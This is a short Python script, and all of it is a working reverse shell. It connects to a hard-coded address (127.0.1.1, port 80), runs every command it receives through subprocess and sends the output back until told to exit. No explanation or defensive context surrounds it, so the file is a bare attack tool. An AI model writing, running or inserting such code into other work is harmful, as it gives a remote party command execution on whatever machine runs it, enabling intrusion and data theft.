import socket, subprocess, os
H='127.0.1.1'
P = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((H, P))
while True:
    c = s.recv(1024).decode()
    if c.strip() == "exit": break
    o = subprocess.getoutput(c)
    s.send(o.encode())
s.close()
